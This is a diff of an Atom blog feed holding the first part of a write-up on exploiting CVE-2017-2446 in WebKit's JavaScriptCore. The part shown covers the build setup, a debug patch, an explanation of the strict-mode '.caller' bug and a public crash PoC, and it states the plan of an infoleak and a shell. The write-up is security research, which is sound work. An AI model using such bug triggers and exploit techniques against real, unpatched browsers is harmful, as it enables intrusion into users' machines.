@@ -1,5 +1,808 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Diary of a reverse-engineer</title><link href="/" rel="alternate"></link><link href="/feeds/all.atom.xml" rel="self"></link><id>/</id><updated>2018-05-17T11:52:00-07:00</updated><entry><title>Breaking ledgerctf's AES white-box challenge</title><link href="/blog/2018/05/17/breaking-ledgerctfs-aes-white-box-challenge/" rel="alternate"></link><published>2018-05-17T11:52:00-07:00</published><updated>2018-05-17T11:52:00-07:00</updated><author><name>Axel "0vercl0k" Souchet</name></author><id>tag:None,2018-05-17:/blog/2018/05/17/breaking-ledgerctfs-aes-white-box-challenge/</id><summary type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Diary of a reverse-engineer</title><link href="/" rel="alternate"></link><link href="/feeds/all.atom.xml" rel="self"></link><id>/</id><updated>2018-07-14T18:49:00-07:00</updated><entry><title>CVE-2017-2446 or JSC::JSGlobalObject::isHavingABadTime.</title><link href="/blog/2018/07/14/cve-2017-2446-or-jscjsglobalobjectishavingabadtime/" rel="alternate"></link><published>2018-07-14T18:49:00-07:00</published><updated>2018-07-14T18:49:00-07:00</updated><author><name>yrp</name></author><id>tag:None,2018-07-14:/blog/2018/07/14/cve-2017-2446-or-jscjsglobalobjectishavingabadtime/</id><summary type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;This post will cover the development of an exploit for JavaScriptCore (JSC) from the perspective of someone with no background in browser exploitation.&lt;/p&gt;
+&lt;p&gt;Around the start of the year, I was pretty burnt out on CTF problems and was interested in writing an exploit for something more complicated and practical. I settled on writing a WebKit exploit for a few reasons:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;It is code that is broadly used in the real world&lt;/li&gt;
+&lt;li&gt;Browsers seemed like a cool target in an area I had little familiarity (both C++ and interpreter exploitation.)&lt;/li&gt;
+&lt;li&gt;WebKit is (supposedly) the softest of the major browser targets.&lt;/li&gt;
+&lt;li&gt;There were good existing resources on WebKit exploitation, namely &lt;a href="http://phrack.org/papers/attacking_javascript_engines.html"&gt;saelo’s Phrack article&lt;/a&gt;, as well as a variety of public console exploits.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;With this in mind, I got a recommendation for an interesting looking bug that has not previously been publicly exploited: &lt;a href="https://twitter.com/natashenka"&gt;@natashenka&lt;/a&gt;’s CVE-2017-2446 from the &lt;a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1032"&gt;project zero bugtracker&lt;/a&gt;. The bug report had a PoC which crashed in &lt;code&gt;memcpy()&lt;/code&gt; with some partially controlled registers, which is always a promising start.&lt;/p&gt;
+&lt;p&gt;This post assumes you’ve read saelo’s Phrack article linked above, particularly the portions on NaN boxing and butterflies -- I can’t do a better job of explaining these concepts than the article. Additionally, you should be able to run a browser/JavaScript engine in a debugger -- we will target Linux for this post, but the concepts should translate to your preferred platform/debugger.&lt;/p&gt;
+&lt;p&gt;Finally, the goal of doing this initially and now writing it up was and is to learn as much as possible. There is clearly a lot more for me to learn in this area, so if you read something that is incorrect, inefficient, unstable, a bad idea, or just have some thoughts to share, I’d love to hear from you.&lt;/p&gt;
+</summary><content type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;This post will cover the development of an exploit for JavaScriptCore (JSC) from the perspective of someone with no background in browser exploitation.&lt;/p&gt;
+&lt;p&gt;Around the start of the year, I was pretty burnt out on CTF problems and was interested in writing an exploit for something more complicated and practical. I settled on writing a WebKit exploit for a few reasons:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;It is code that is broadly used in the real world&lt;/li&gt;
+&lt;li&gt;Browsers seemed like a cool target in an area I had little familiarity (both C++ and interpreter exploitation.)&lt;/li&gt;
+&lt;li&gt;WebKit is (supposedly) the softest of the major browser targets.&lt;/li&gt;
+&lt;li&gt;There were good existing resources on WebKit exploitation, namely &lt;a href="http://phrack.org/papers/attacking_javascript_engines.html"&gt;saelo’s Phrack article&lt;/a&gt;, as well as a variety of public console exploits.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;With this in mind, I got a recommendation for an interesting looking bug that has not previously been publicly exploited: &lt;a href="https://twitter.com/natashenka"&gt;@natashenka&lt;/a&gt;’s CVE-2017-2446 from the &lt;a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1032"&gt;project zero bugtracker&lt;/a&gt;. The bug report had a PoC which crashed in &lt;code&gt;memcpy()&lt;/code&gt; with some partially controlled registers, which is always a promising start.&lt;/p&gt;
+&lt;p&gt;This post assumes you’ve read saelo’s Phrack article linked above, particularly the portions on NaN boxing and butterflies -- I can’t do a better job of explaining these concepts than the article. Additionally, you should be able to run a browser/JavaScript engine in a debugger -- we will target Linux for this post, but the concepts should translate to your preferred platform/debugger.&lt;/p&gt;
+&lt;p&gt;Finally, the goal of doing this initially and now writing it up was and is to learn as much as possible. There is clearly a lot more for me to learn in this area, so if you read something that is incorrect, inefficient, unstable, a bad idea, or just have some thoughts to share, I’d love to hear from you.&lt;/p&gt;
+
+
+&lt;div class="toc"&gt;&lt;span class="toctitle"&gt;Table of contents:&lt;/span&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#introduction"&gt;Introduction&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#target-setup-and-tooling"&gt;Target Setup and Tooling&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#target-modifications"&gt;Target modifications&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#other-useful-jsc-features"&gt;Other useful jsc features&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#symbols"&gt;Symbols&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#dumping-object-layouts"&gt;Dumping Object Layouts&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#bug"&gt;Bug&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#infoleak"&gt;Infoleak&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#concat-in-more-detail"&gt;concat in more detail&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#jsobject-layouts"&gt;JSObject layouts&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#salvation-through-symbols"&gt;Salvation Through Symbols&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#diagrams"&gt;Diagrams&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#oob-memory-is-a-large-value"&gt;OOB memory is a large value&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#oob-memory-is-a-zero"&gt;OOB Memory is a zero&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#notes-on-fastmalloc"&gt;Notes on fastMalloc&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#arbitrary-write"&gt;Arbitrary Write&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#failure-nan-boxing"&gt;Failure: NaN boxing&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#failure-smashing-fastmalloc"&gt;Failure: Smashing fastMalloc&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#control-flow"&gt;Control Flow&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#intldatetimeformat-crash"&gt;Intl.DateTimeFormat Crash&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#exploit-planning"&gt;Exploit Planning&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#one_gadget"&gt;one_gadget&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#memory-layout-and-rop"&gt;Memory layout and ROP&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#reverse-gadgets"&gt;Reverse gadgets&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#putting-it-all-together"&gt;Putting it all together&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#conclusion"&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;h2 id="target-setup-and-tooling"&gt;Target Setup and Tooling&lt;/h2&gt;
+&lt;p&gt;First, we need a vulnerable version of WebKit. &lt;a href="https://github.com/WebKit/webkit/tree/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/JavaScriptCore"&gt;&lt;code&gt;e72e58665d57523f6792ad3479613935ecf9a5e0&lt;/code&gt;&lt;/a&gt; is the hash of the last vulnerable version (the fix is in &lt;a href="https://github.com/WebKit/webkit/commit/f7303f96833aa65a9eec5643dba39cede8d01144"&gt;&lt;code&gt;f7303f96833aa65a9eec5643dba39cede8d01144&lt;/code&gt;&lt;/a&gt;) so we check out and build off this.&lt;/p&gt;
+&lt;p&gt;To stay in more familiar territory, I decided to only target the &lt;code&gt;jsc&lt;/code&gt; binary, not WebKit browser as a whole. &lt;code&gt;jsc&lt;/code&gt; is a thin command line wrapper around &lt;code&gt;libJavaScriptCore&lt;/code&gt;, the library WebKit uses for its JavaScript engine. This means any exploit for &lt;code&gt;jsc&lt;/code&gt;, with some modification, should also work in WebKit. I’m not sure if this was a good idea in retrospect -- it had the benefit of resulting in a stable heap as well as reducing the amount of code I had to read and understand, but had fewer codepaths and objects available for the exploit.&lt;/p&gt;
+&lt;p&gt;I decided to target WebKit on Linux instead of macOS mainly due to debugger familiarity (gdb + &lt;a href="https://github.com/hugsy/gef"&gt;gef&lt;/a&gt;). For code browsing, I ended up using &lt;code&gt;vim&lt;/code&gt; and &lt;code&gt;rtags&lt;/code&gt;, which was… okay. If you have suggestions for C++ code auditing, I’d like to hear them.&lt;/p&gt;
+&lt;h3 id="target-modifications"&gt;Target modifications&lt;/h3&gt;
+&lt;p&gt;I found that I frequently wanted to breakpoint in my scripts to examine the interpreter state. After screwing around with this for a while I eventually just added a &lt;code&gt;dbg()&lt;/code&gt; function to &lt;code&gt;jsc&lt;/code&gt;. This would allow me to write code like:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nx"&gt;dbg&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="c1"&gt;// examine the memory layout&lt;/span&gt;
+&lt;span class="nx"&gt;foo&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="c1"&gt;// do something&lt;/span&gt;
+&lt;span class="nx"&gt;dbg&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="c1"&gt;//see how things have changed&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The patch to add &lt;code&gt;dbg()&lt;/code&gt; to &lt;code&gt;jsc&lt;/code&gt; is pretty straightforward.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gh"&gt;diff --git diff --git a/Source/JavaScriptCore/jsc.cpp b/Source/JavaScriptCore/jsc.cpp&lt;/span&gt;
+&lt;span class="gh"&gt;index bda9a09d0d2..d359518b9b6 100644&lt;/span&gt;
+&lt;span class="gd"&gt;--- a/Source/JavaScriptCore/jsc.cpp&lt;/span&gt;
+&lt;span class="gi"&gt;+++ b/Source/JavaScriptCore/jsc.cpp&lt;/span&gt;
+&lt;span class="gu"&gt;@@ -994,6 +994,7 @@ static EncodedJSValue JSC_HOST_CALL functionSetHiddenValue(ExecState*);&lt;/span&gt;
+ static EncodedJSValue JSC_HOST_CALL functionPrintStdOut(ExecState*);
+ static EncodedJSValue JSC_HOST_CALL functionPrintStdErr(ExecState*);
+ static EncodedJSValue JSC_HOST_CALL functionDebug(ExecState*);
+&lt;span class="gi"&gt;+static EncodedJSValue JSC_HOST_CALL functionDbg(ExecState*);&lt;/span&gt;
+ static EncodedJSValue JSC_HOST_CALL functionDescribe(ExecState*);
+ static EncodedJSValue JSC_HOST_CALL functionDescribeArray(ExecState*);
+ static EncodedJSValue JSC_HOST_CALL functionSleepSeconds(ExecState*);
+&lt;span class="gu"&gt;@@ -1218,6 +1219,7 @@ protected:&lt;/span&gt;
+
+         addFunction(vm, &amp;quot;debug&amp;quot;, functionDebug, 1);
+         addFunction(vm, &amp;quot;describe&amp;quot;, functionDescribe, 1);
+&lt;span class="gi"&gt;+        addFunction(vm, &amp;quot;dbg&amp;quot;, functionDbg, 0);&lt;/span&gt;
+         addFunction(vm, &amp;quot;describeArray&amp;quot;, functionDescribeArray, 1);
+         addFunction(vm, &amp;quot;print&amp;quot;, functionPrintStdOut, 1);
+         addFunction(vm, &amp;quot;printErr&amp;quot;, functionPrintStdErr, 1);
+&lt;span class="gu"&gt;@@ -1752,6 +1754,13 @@ EncodedJSValue JSC_HOST_CALL functionDebug(ExecState* exec)&lt;/span&gt;
+     return JSValue::encode(jsUndefined());
+ }
+
+&lt;span class="gi"&gt;+EncodedJSValue JSC_HOST_CALL functionDbg(ExecState* exec)&lt;/span&gt;
+&lt;span class="gi"&gt;+{&lt;/span&gt;
+&lt;span class="gi"&gt;+       asm(&amp;quot;int3;&amp;quot;);&lt;/span&gt;
+&lt;span class="gi"&gt;+&lt;/span&gt;
+&lt;span class="gi"&gt;+       return JSValue::encode(jsUndefined());&lt;/span&gt;
+&lt;span class="gi"&gt;+}&lt;/span&gt;
+&lt;span class="gi"&gt;+&lt;/span&gt;
+ EncodedJSValue JSC_HOST_CALL functionDescribe(ExecState* exec)
+ {
+     if (exec-&amp;gt;argumentCount() &amp;lt; 1)
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3 id="other-useful-jsc-features"&gt;Other useful &lt;code&gt;jsc&lt;/code&gt; features&lt;/h3&gt;
+&lt;p&gt;Two helpful functions added to the interpreter by &lt;code&gt;jsc&lt;/code&gt; are &lt;code&gt;describe()&lt;/code&gt; and &lt;code&gt;describeArray()&lt;/code&gt;. As these functions would not be present in an actual target interpreter, they are not fair game for use in an exploit, however are very useful when debugging:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;gt;&amp;gt;&amp;gt; a = [0x41, 0x42];
+65,66
+&amp;gt;&amp;gt;&amp;gt; describe(a);
+Object: 0x7fc5663b01f0 with butterfly 0x7fc5663caec8 (0x7fc5663eac20:[Array, {}, ArrayWithInt32, Proto:0x7fc5663e4140, Leaf]), ID: 88
+&amp;gt;&amp;gt;&amp;gt; describeArray(a);
+&amp;lt;Butterfly: 0x7fc5663caec8; public length: 2; vector length: 3&amp;gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3 id="symbols"&gt;Symbols&lt;/h3&gt;
+&lt;p&gt;Release builds of WebKit don’t have asserts enabled, but they also don’t have symbols. Since we want symbols, we will build with &lt;code&gt;CFLAGS=-g CXXFLAGS=-g Scripts/Tools/build-webkit --jsc-only&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;The symbol information can take quite some time to parse by the debugger. We can reduce the load time of the debugger significantly by running &lt;code&gt;gdb-add-index&lt;/code&gt; on both &lt;code&gt;jsc&lt;/code&gt; and &lt;code&gt;libJavaScriptCore.so&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id="dumping-object-layouts"&gt;Dumping Object Layouts&lt;/h3&gt;
+&lt;p&gt;WebKit ships with a script for macOS to dump the object layout of various classes, for example, here is &lt;code&gt;JSC::JSString&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;x@webkit:~/WebKit/Tools/Scripts$ ./dump-class-layout JSC JSString
+Found 1 types matching &amp;quot;JSString&amp;quot; in &amp;quot;/home/x/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so&amp;quot;
+  +0 { 24} JSString
+  +0 {  8}     JSC::JSCell
+  +0 {  1}         JSC::HeapCell
+  +0 &amp;lt;  4&amp;gt;         JSC::StructureID m_structureID;
+  +4 &amp;lt;  1&amp;gt;         JSC::IndexingType m_indexingTypeAndMisc;
+  +5 &amp;lt;  1&amp;gt;         JSC::JSType m_type;
+  +6 &amp;lt;  1&amp;gt;         JSC::TypeInfo::InlineTypeFlags m_flags;
+  +7 &amp;lt;  1&amp;gt;         JSC::CellState m_cellState;
+  +8 &amp;lt;  4&amp;gt;     unsigned int m_flags;
+ +12 &amp;lt;  4&amp;gt;     unsigned int m_length;
+ +16 &amp;lt;  8&amp;gt;     WTF::String m_value;
+ +16 &amp;lt;  8&amp;gt;         WTF::RefPtr&amp;lt;WTF::StringImpl&amp;gt; m_impl;
+ +16 &amp;lt;  8&amp;gt;             WTF::StringImpl * m_ptr;
+Total byte size: 24
+Total pad bytes: 0
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This script required minor modifications to run on linux, but it was quite useful later on.&lt;/p&gt;
+&lt;h2 id="bug"&gt;Bug&lt;/h2&gt;
+&lt;p&gt;With our target built and tooling set up, let’s dig into the bug a bit. JavaScript (apparently) has a feature to get the caller of a function:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;q&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nx"&gt;q&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;caller&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;g&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="nx"&gt;g&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="c1"&gt;// ‘q’ is now equal to ‘g’&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This behavior is disabled under certain conditions, notably if the JavaScript code is running in strict mode. The specific bug here is that if you called from a strict function to a non-strict function, JSC would allow you to get a reference to the strict function. From the PoC provided you can see how this is a problem:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;q&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="c1"&gt;// this is a non-strict chunk of code, so getting the caller is allowed&lt;/span&gt;
+&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;g&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
+    &lt;span class="nx"&gt;q&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;g&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;caller&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="c1"&gt;// when anything, including the runtime, accesses a[3], g will be called&lt;/span&gt;
+&lt;span class="nb"&gt;Object&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;defineProperty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;Array&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;prototype&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;3&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;get&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;g&lt;/span&gt;&lt;span class="p"&gt;});&lt;/span&gt;
+&lt;span class="c1"&gt;// trigger the runtime access of a[3]&lt;/span&gt;
+&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;concat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="c1"&gt;// q now is a reference to an internal runtime function&lt;/span&gt;
+&lt;span class="nx"&gt;q&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x77777777&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x77777777&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// crash&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In this case, the &lt;code&gt;concat&lt;/code&gt; code is in &lt;a href="https://github.com/WebKit/webkit/blob/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/JavaScriptCore/builtins/ArrayPrototype.js#L713"&gt;&lt;code&gt;Source/JavaScriptCore/builtins/ArrayPrototype.js&lt;/code&gt;&lt;/a&gt; and is marked as ‘use strict’.&lt;/p&gt;
+&lt;p&gt;This behavior is not always exploitable: we need a JS runtime function ‘a’ which performs sanitization on arguments, then calls another runtime function ‘b’ which can be coerced into executing user supplied JavaScript to get a function reference to ‘b’. This will allow you to do &lt;code&gt;b(0x41, 0x42)&lt;/code&gt;, skipping the sanitization on your inputs which ‘a’ would normally perform.&lt;/p&gt;
+&lt;p&gt;The JSC runtime is a combination of JavaScript and C++ which kind of looks like this:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;+-------------+
+| User Code   | &amp;lt;- user-provided code
++-------------+
+| JS Runtime  | &amp;lt;- JS that ships with the browser as part of the runtime
++-------------+
+| Cpp Runtime | &amp;lt;- C++ that implements the rest of the runtime
++-------------+
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The &lt;code&gt;Array.concat&lt;/code&gt; above is a good example of this pattern: when &lt;code&gt;concat()&lt;/code&gt; is called it first goes into &lt;code&gt;ArrayPrototype.js&lt;/code&gt; to perform sanitization on the argument, then calls into one of the concat implementations. The fastpath implementations are generally written in C++, while the slowpaths are either pure JS, or a different C++ implementation.&lt;/p&gt;
+&lt;p&gt;What makes this bug useful is the reference to the function we get (‘q’ in the above snippet) is &lt;em&gt;after&lt;/em&gt; the input sanitization performed by the JavaScript layer, meaning we have a direct reference to the native function.&lt;/p&gt;
+&lt;p&gt;The provided PoC is an especially powerful example of this, however there are others -- some useful, some worthless. In terms of a general plan, we’ll need to use this bug to create an infoleak to defeat ASLR, then figure out a way to use it to hijack control flow and get a shell out of it.&lt;/p&gt;
+&lt;h2 id="infoleak"&gt;Infoleak&lt;/h2&gt;
+&lt;p&gt;Defeating ASLR is the first order of business. To do this, we need to understand the reference we have in the &lt;code&gt;concat&lt;/code&gt; code.&lt;/p&gt;
+&lt;h3 id="concat-in-more-detail"&gt;&lt;code&gt;concat&lt;/code&gt; in more detail&lt;/h3&gt;
+&lt;p&gt;Tracing the codepath from our &lt;code&gt;concat&lt;/code&gt; call, we start in &lt;a href="https://github.com/WebKit/webkit/blob/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/JavaScriptCore/builtins/ArrayPrototype.js#L713"&gt;&lt;code&gt;Source/JavaScriptCore/builtins/ArrayPrototype.js&lt;/code&gt;&lt;/a&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;concat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;first&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="s2"&gt;&amp;quot;use strict&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+    &lt;span class="c1"&gt;// [1] perform some input validation&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="nx"&gt;argumentCount&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
+        &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="nx"&gt;isJSArray&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="nx"&gt;isConcatSpreadableSymbol&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="kc"&gt;undefined&lt;/span&gt;
+        &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="nx"&gt;isObject&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;first&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="nx"&gt;first&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="nx"&gt;isConcatSpreadableSymbol&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="kc"&gt;undefined&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+
+        &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="nx"&gt;concatMemcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;first&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// [2] call the fastpath&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;result&lt;/span&gt; &lt;span class="o"&gt;!==&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+
+    &lt;span class="c1"&gt;// … snip ...&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
